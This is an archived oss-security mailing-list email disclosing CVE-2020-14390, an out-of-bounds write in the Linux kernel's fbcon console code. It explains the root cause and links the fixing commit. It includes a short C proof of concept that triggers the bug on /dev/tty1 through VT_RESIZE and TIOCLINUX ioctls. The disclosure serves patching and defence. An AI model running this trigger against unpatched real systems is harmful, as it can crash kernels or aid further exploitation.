X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1289" "Tuesday" "15" "September" "2020" "18:23:20" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp7F86OfgeOLROT7bGwH1jkTivrHp6KOsEnsHDaEq166AQ@mail.gmail.com>" "46" "[oss-security] CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon" nil nil nil "9" "2020091510:23:20" "[oss-security] CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon" (number mark "U       yuanmingbuaa Sep 15   46/1289  " thread-indent "\"[oss-security] CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19733 invoked by uid 550); 15 Sep 2020 11:06:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3360 invoked from network); 15 Sep 2020 10:23:43 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=FHz8kO0nmWbB0MPrGgf4yv/XxtA9rjKNXCJqpSd2+iY=;
        b=VbuEn4uB/8Qt4zWsIBh50b9vLTPQLUXHjEFOWVtsZVLnQSwhejDWmnUrdcwfGUgo1B
         mx/IF5IFdOEIZf5445oF84Q4xj19Df1S3/g8SdJuYEP5LmZHG/XG5LmPVlH4IpiPHiHt
         yivNH7wDNcivVxZN7eeHKIwYAqnpEQQQbTyMkJgkiPNJkmJIg+KXqqZh1FhaLDx2qPZN
         8aFFkCNxy9oGPjAJZ1CigSPKOvKPPwaTsFC9jXCzqivDXKMt7GzBypgVQN97a61Sw7rk
         jvGwOX+GapXFyfuyd/pcy7DpwxWEGogHoioTZx+Nh5Mpob/sWv97GXnAoPu2PoSoRv6x
         RvTQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=FHz8kO0nmWbB0MPrGgf4yv/XxtA9rjKNXCJqpSd2+iY=;
        b=pTXwMa1usxDzluTJxLntsUyOLBO5EbzBJ3tJBYIHHAN3Nu2DGROexDx9NDfAr0p/lI
         qNVPvfkjr718MmTrcNBg8iZi26zebfEBvDEbfKAjTBhZDCqpLhHRIQFn42qGM5W+SvKC
         H1U8J6AT0jV5FkVr4TguvI7g7g3sg8XH5YOK07S29FI7cCd/ge7V8rjys2ghcBpVgZE8
         NrbmRYeDbYcirkacE78TgnheLj1KK3lDnxnKJCTRi05feci34VOQC9LPs/fmv3da0CJb
         pLGMM+unoi7cg/EAbGKFpnFqR7OHe8KTN7Ght0wl3IzUdcn2h3fi2sQx+NHh95u+1hVq
         KvYA==
X-Gm-Message-State: AOAM533PXUPFy16DLf3oxIemneU/do8Oze9sOvE5CIUEQ2lwFwS3cJqk
	SC6V4Bp4XbqUtq0lGcrp/URcKfftrsprVjDnjsNaC/Zv2BL6yg==
X-Google-Smtp-Source: ABdhPJxlw4Ic3XbDCLAP1qNi++dc54B+yTR8T7lNGWhiwUMfTXUMfgg7M9oZgVmxMxsUeOb/hTlYYdrh0XLbeA111X8=
X-Received: by 2002:a17:906:4d97:: with SMTP id s23mr19903000eju.157.1600165411374;
 Tue, 15 Sep 2020 03:23:31 -0700 (PDT)
MIME-Version: 1.0
From: Minh Yuan <yuanmingbuaa@gmail.com>
Date: Tue, 15 Sep 2020 18:23:20 +0800
Message-ID: <CAH5WSp7F86OfgeOLROT7bGwH1jkTivrHp6KOsEnsHDaEq166AQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000ed4b9c05af578a7d"
Subject: [oss-security] CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon

--000000000000ed4b9c05af578a7d
Content-Type: text/plain; charset="UTF-8"

Hi,

I found a out-of-bound write in fbcon_redraw_softback while the kernel
version <= 5.9.rc5. The oldest affected kernel version is 2.2.3.
The root cause of this vulnerability is that the value of vc->vc_origin is
not updated in time while invoking vc_do_resize.

This is my PoC (need the permission to open and write the tty, and need to
have a fbcon driver):

// author by ziiiro@thu
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>


int main(int argc, char** argv)
{
        int fd = open("/dev/tty1", O_RDWR, 0);
        unsigned short size1[3] = {3, 0x21, 0};
        ioctl(fd, 0x5609, size1); // VT_RESIZE
        for (int i = 0; i < 30; i++) {
            write(fd, "\x0a", 1);
        }

        signed int args[3] = {13, -5, 0};
        ioctl(fd, 0x541c, args); // TIOCLINUX
        unsigned short size2[3] = {3, 0x39, 0};
        ioctl(fd, 0x5609, size2); // VT_RESIZE
}


This is the commit to patch the issue:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=50145474f6ef4a9c19205b173da6264a644c7489

Thanks,
Yuan Ming, Tsinghua University

--000000000000ed4b9c05af578a7d--
